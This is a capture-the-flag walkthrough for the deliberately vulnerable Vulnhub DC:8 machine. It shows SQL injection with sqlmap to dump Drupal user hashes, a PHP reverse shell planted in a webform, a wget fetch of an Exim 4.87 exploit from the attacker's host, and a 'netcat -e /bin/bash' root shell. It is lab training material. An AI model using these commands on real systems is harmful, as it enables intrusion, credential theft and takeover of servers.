# DC:8 CTF Walkthrough (Vulnhub) 

###### <p align="center"> *This is official repository maintained by me*</center> </p>
###### <p align="center"> *[yigitdrbk](https://www.instagram.com/yigitdrbk/) *</center> </p>

DC:8 is a CTF created by DCAU. You can find the technical information about this CTF on the VulnHub page. First of all, make sure to download and install the correct OVA file from VulnHub. (https://download.vulnhub.com/dc/DC-8.zip)

This CTF is quite challenging, and it's a bit difficult to locate the vulnerability at first. However, once you find it, the rest of the machine is not too hard, especially if you're good at searching for information. This machine requires a solid understanding of file permissions and SUID concepts.

## 1 - Reconnaissance

I scanned open ports first with Rustscan and then continue with version and script scan with nmap. And then tried to perform directory scan but nothing important show up. But still I will give you the commands.

```bash
rustscan <machine_ip>
nmap -PN -sS -sV --script vuln <machine_ip> -p <open_ports> -oN finalscan

dirsearch -u <machine_ip>
```
The website uses Drupal Cms again, but the version doesn’t have any vulnerability.

I checked the robots.txt file, source code, etc., but didn’t find anything significant. I tried using Nikto and SQLMap. Nikto didn’t return any results, but SQLMap was different. Apparently, I can access the database with SQLMap.

I suspected to sql injection because each website links the url was different.

## 2- Enumeration

```bash
sqlmap -u 'http://<machine_ip>/?nid=1' 
```

It gave me the databases. And with the below 2 databases , I tried to enumerate d7db.

![DC8](https://miro.medium.com/v2/resize:fit:828/format:webp/1*E02j5k_tCrer5rY5cQRK8w.png "DC8")

```bash
sqlmap -u 'http://<machine_ip>/?nid=1' -D d7db --tables
```

One of the tables name was ‘users’ so I tried to enumerate it.

```bash
sqlmap -u 'http://<machine_ip>/?nid=1' -D d7db --tables -T users --dump
```

There was just 2 users : john and admin. And both of them have drupal7 hash. I tried to crack it with john. I knew it was drupal hash because I searched it on ‘https://hashes.com/en/tools/hash_identifier’.

```bash
john --format=drupal7 hash.txt
```

I cracked john’s password. But I couldn’t crack admin’s. The John’s password was turtle.

(By the way , if you cracked the hash but you forgot it. John will say loaded 1 password hash no password hashes left so you should tried to command ‘ john — show hash.txt)

## 3-Website Side & Getting a Reverse Shell

I tried to SSH using John’s password, but it didn’t work. So, I attempted to log in with John’s credentials on the website and discovered I could edit certain elements on the webpage. I first tried editing the webform by changing its paragraphs. But most importantly, I found I could edit its actions and inject a PHP reverse shell. There was a confirmation message, which I replaced with PHP code. Then, I started a Netcat session on my local computer. Now, I have a shell.

![DC8](https://miro.medium.com/v2/resize:fit:828/format:webp/1*YewVscEz8JkaGobLtba-qA.png "DC8")

I tried to search what commands can I run with setuid permissions.

```bash
find / -perm -4000 -type -f 2>/dev/null
```

The above command give me some commands, but there was one interesting. It was “/usr/sbin/exim4”. I just go to that directory and tried to run it with ./exim4. It gave me the output.

```bash
./exim4
Exim is a Mail Transfer Agent. It is normally called by Mail User Agents,
not directly from a shell command line. Options and/or arguments control
what it does when called. For a list of options, see the Exim documentation.
www-data@dc-8:/usr/sbin$ 
```

## 4- Privilege Escalation

I searched on the internet if there is vulnerable with exim4. But the version must be given. I tried to add — version parameter know I know the version. So I tried to search “ exim4 4.87 exploit” the exploitdb comes out first.

So I just created the exploit.sh in my local computer than give it with wget on ssh session. Then run with netcat version.

```bash
vim exploit.sh
php -S 10.0.2.4:8000

(ssh session)
wget http://10.0.2.4:8000/exploit.sh
chmod 777 exploit.sh
```
It is crucial to make this operations on /tmp folder. Because the file permissions is different here.

And then I run the next commands to get a root netcat shell.

```bash
first run the netcat session on local.
rlwrap nc -lvnp 1332

# Usage (netcat method):
# $ id
# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
# $ ./raptor_exim_wiz -m netcat (./exploit.sh -m netcat in my case)
# Delivering netcat payload...
# Waiting 5 seconds...
netcat -e /bin/bash <local_ip> 1332
# localhost [127.0.0.1] 31337 (?) open
# id
# uid=0(root) gid=0(root) groups=0(root)
# 
# Vulnerable platforms:
# Exim 4.87 - 4.91
```

Now I have root session and I can read the root flag.

![DC8](https://miro.medium.com/v2/resize:fit:3836/format:webp/1*aOHeiiUyObxV3OBSsuBBig.png "DC8")

Developer / Author: [yigitdrbk](https://www.instagram.com/yigitdrbk/)